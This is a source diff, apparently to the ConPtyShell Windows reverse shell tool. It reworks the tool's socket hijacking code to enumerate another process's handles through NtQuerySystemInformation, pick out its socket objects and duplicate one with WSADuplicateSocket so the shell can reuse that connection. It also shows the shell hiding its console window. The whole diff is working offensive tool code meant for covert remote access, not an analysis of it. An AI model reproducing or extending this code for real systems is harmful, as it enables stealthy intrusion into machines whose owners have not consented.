@@ -6,6 +6,7 @@ using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Collections.Generic;
 
 public class ConPtyShellException : Exception
 {
@@ -410,60 +411,148 @@ public static class SocketHijacking {
         Marshal.FreeHGlobal(ptrHandlesInfo);
         return socketHandle;
     }
-    
-    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess){
-        IntPtr parentSocketHandle = IntPtr.Zero;
-        SOCKADDR_IN sockaddrTargetProcess = new SOCKADDR_IN();
-        SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();
-        int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrTargetProcess);
-        int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);
-        parentSocketHandle = GetSocketTargetProcess(parentProcess);
 
-        if(parentSocketHandle == IntPtr.Zero)
-            return false;
-        if(getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) != 0){
-            Console.WriteLine("getpeername sockaddrTargetProcess failed with wsalasterror " + WSAGetLastError().ToString());
-            CloseHandle(parentSocketHandle);
-            return false;
+
+    public static List<IntPtr> GetSocketsTargetProcess(Process targetProcess)
+    {
+        OBJECT_NAME_INFORMATION objNameInfo;
+        long HandlesCount = 0;
+        IntPtr dupHandle;
+        IntPtr ptrObjectName;
+        IntPtr ptrHandlesInfo;
+        IntPtr hTargetProcess;
+        string strObjectName;
+        List<IntPtr> socketsHandles = new List<IntPtr>();
+        DeadlockCheckHelper deadlockCheckHelperObj = new DeadlockCheckHelper();
+
+        hTargetProcess = OpenProcess(ProcessAccessFlags.DuplicateHandle, false, targetProcess.Id);
+        if (hTargetProcess == IntPtr.Zero)
+        {
+            Console.WriteLine("Cannot open target process with pid " + targetProcess.Id.ToString() + " for DuplicateHandle access");
+            return socketsHandles;
         }
-        if(getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) != 0){
-            Console.WriteLine("getpeername sockaddrParentProcess failed with wsalasterror " + WSAGetLastError().ToString());
-            CloseHandle(parentSocketHandle);
-            return false;
+
+        ptrHandlesInfo = NtQuerySystemInformationDynamic(SystemHandleInformation, 0);
+        HandlesCount = Marshal.ReadIntPtr(ptrHandlesInfo).ToInt64();
+        // create a pointer at the beginning of the address of SYSTEM_HANDLE_TABLE_ENTRY_INFO[]
+        IntPtr ptrHandlesInfoCurrent = new IntPtr(ptrHandlesInfo.ToInt64() + IntPtr.Size);
+        // get TypeIndex for "File" objects, needed to filter only sockets objects
+        byte TypeIndexFileObject = GetTypeIndexByName("File");
+        for (int i = 0; i < HandlesCount; i++)
+        {
+            SYSTEM_HANDLE_TABLE_ENTRY_INFO sysHandle;
+            try
+            {
+                sysHandle = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)Marshal.PtrToStructure(ptrHandlesInfoCurrent, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO));
+            }
+            catch
+            {
+                break;
+            }
+            //move pointer to next SYSTEM_HANDLE_TABLE_ENTRY_INFO
+            ptrHandlesInfoCurrent = (IntPtr)(ptrHandlesInfoCurrent.ToInt64() + Marshal.SizeOf(new SYSTEM_HANDLE_TABLE_ENTRY_INFO()));
+            if (sysHandle.UniqueProcessId != targetProcess.Id || sysHandle.ObjectTypeIndex != TypeIndexFileObject)
+                continue;
+            if (DuplicateHandle(hTargetProcess, (IntPtr)sysHandle.HandleValue, GetCurrentProcess(), out dupHandle, 0, false, DUPLICATE_SAME_ACCESS))
+            {
+                if (deadlockCheckHelperObj.CheckDeadlockDetected(dupHandle))
+                { // this will avoids deadlocks on special named pipe handles
+                    // Console.WriteLine("debug: Deadlock detected");
+                    CloseHandle(dupHandle);
+                    continue;
+                }
+                ptrObjectName = NtQueryObjectDynamic(dupHandle, OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
+                if (ptrObjectName == IntPtr.Zero)
+                {
+                    CloseHandle(dupHandle);
+                    continue;
+                }
+                try
+                {
+                    objNameInfo = (OBJECT_NAME_INFORMATION)Marshal.PtrToStructure(ptrObjectName, typeof(OBJECT_NAME_INFORMATION));
+                }
+                catch
+                {
+                    continue;
+                }
+                if (objNameInfo.Name.Buffer != IntPtr.Zero && objNameInfo.Name.Length > 0)
+                {
+                    strObjectName = Marshal.PtrToStringUni(objNameInfo.Name.Buffer, objNameInfo.Name.Length / 2);
+                    // Console.WriteLine("debug: strObjectName " + strObjectName);
+                    if (strObjectName == "\\Device\\Afd")
+                        socketsHandles.Add(dupHandle);
+                    else
+                        CloseHandle(dupHandle);
+                }
+                else
+                    CloseHandle(dupHandle);
+                Marshal.FreeHGlobal(ptrObjectName);
+                ptrObjectName = IntPtr.Zero;
+            }
         }
-        if(sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port){
-            CloseHandle(parentSocketHandle);
-            return true;
+        Marshal.FreeHGlobal(ptrHandlesInfo);
+        if (socketsHandles.Count >= 2)
+            socketsHandles.Sort(delegate (IntPtr a, IntPtr b) { return (b.ToInt64().CompareTo(a.ToInt64())); });
+        return socketsHandles;
+    }
+
+    public static bool IsSocketInherited(IntPtr socketHandle, Process parentProcess){
+        bool inherited = false;
+        List<IntPtr> parentSocketsHandles = GetSocketsTargetProcess(parentProcess);
+        if(parentSocketsHandles.Count < 1)
+            return inherited;
+        foreach (IntPtr parentSocketHandle in parentSocketsHandles)
+        {
+            SOCKADDR_IN sockaddrTargetProcess = new SOCKADDR_IN();
+            SOCKADDR_IN sockaddrParentProcess = new SOCKADDR_IN();
+            int sockaddrTargetProcessLen = Marshal.SizeOf(sockaddrTargetProcess);
+            int sockaddrParentProcessLen = Marshal.SizeOf(sockaddrParentProcess);
+            if (getpeername(socketHandle, ref sockaddrTargetProcess, ref sockaddrTargetProcessLen) != 0)
+                continue;
+            if (getpeername(parentSocketHandle, ref sockaddrParentProcess, ref sockaddrParentProcessLen) != 0)
+                continue;
+            if (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
+            {
+                // Console.WriteLine("debug: found inherited socket! handle --> 0x" + parentSocketHandle.ToString("X4"));
+                inherited = true;
+                break;
+            }
         }
-        CloseHandle(parentSocketHandle);
-        return false;
+        // cleaning all socket handles
+        foreach (IntPtr dupHandle in parentSocketsHandles)
+            CloseHandle(dupHandle);
+        return inherited;
     }
     
     public static IntPtr DuplicateTargetProcessSocket(Process targetProcess)
     {
         IntPtr targetSocketHandle = IntPtr.Zero;
-        IntPtr dupSocketHandle = IntPtr.Zero;
-        targetSocketHandle = GetSocketTargetProcess(targetProcess);
-        if(targetSocketHandle == IntPtr.Zero )
+        List<IntPtr> targetProcessSockets = GetSocketsTargetProcess(targetProcess);
+        if(targetProcessSockets.Count < 1)
             throw new ConPtyShellException("No \\Device\\Afd objects found. Socket duplication failed.");
         else{
-            WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
             WSAData data;
             if( WSAStartup(2 << 8 | 2, out data) != 0 )
                 throw new ConPtyShellException(String.Format("WSAStartup failed with error code: {0}", WSAGetLastError()));
-            int status = WSADuplicateSocket(targetSocketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
-            if (status != 0) {
-                Console.WriteLine("WSADuplicateSocket failed with error " + status.ToString() + " and wsalasterror " + WSAGetLastError().ToString() );
-                return dupSocketHandle;
+            foreach (IntPtr socketHandle in targetProcessSockets) {
+                IntPtr dupSocketHandle = IntPtr.Zero;
+                WSAPROTOCOL_INFO wsaProtocolInfo = new WSAPROTOCOL_INFO();
+                int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
+                if (status != 0)
+                    continue;
+                dupSocketHandle = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);
+                if (dupSocketHandle == IntPtr.Zero || dupSocketHandle == new IntPtr(-1))
+                    continue;
+                targetSocketHandle = dupSocketHandle;
+                break;
             }
-            dupSocketHandle = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, WSA_FLAG_OVERLAPPED);
-            if (dupSocketHandle == IntPtr.Zero || dupSocketHandle == new IntPtr(-1)) {
-                Console.WriteLine("WSASocket failed with error " + WSAGetLastError().ToString());
-                return dupSocketHandle;
-            }
-            //Console.WriteLine("WSASocket success handlex 0x" + dupSocketHandle.ToString("X4"));
         }
-        return dupSocketHandle;
+        // cleaning all socket handles
+        foreach (IntPtr dupHandle in targetProcessSockets)
+            CloseHandle(dupHandle);
+        if (targetSocketHandle == IntPtr.Zero)
+            throw new ConPtyShellException("Something went wrong in socket duplication."); //this means that WSADuplicateSocket or WSASocket exited with an expected behavior and no sockets candidate has been able to duplicate
+        return targetSocketHandle;
     }        
 }
 
@@ -984,8 +1073,8 @@ public static class ConPtyShell
                 ShowWindow(GetConsoleWindow(), SW_HIDE);
                 newConsoleAllocated = true;
             }
-            //Console.WriteLine("debug: Creating pseudo console...");
-            //return "";
+            // Console.WriteLine("debug: Creating pseudo console...");
+            // return "";
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if(pseudoConsoleCreationResult != 0)
             {
